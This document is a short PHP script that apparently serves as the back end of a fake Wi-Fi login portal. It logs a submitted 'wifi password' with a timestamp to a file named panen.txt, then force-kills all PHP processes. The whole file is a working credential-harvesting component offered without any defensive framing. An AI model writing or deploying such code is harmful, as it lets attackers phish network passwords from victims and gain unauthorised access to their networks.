<?php
  /* set default timezone */
date_default_timezone_set("Asia/Jakarta");
    $date = date('Y-m-d H:i:s')."Z"."\n"; 
	$key1 = "wifi password: ".$_POST['key1']."\n";
    $credential = $date.$key1."\n";
    file_put_contents('panen.txt', $credential, FILE_APPEND);
    
	shell_exec('pkill -9 php');
?>
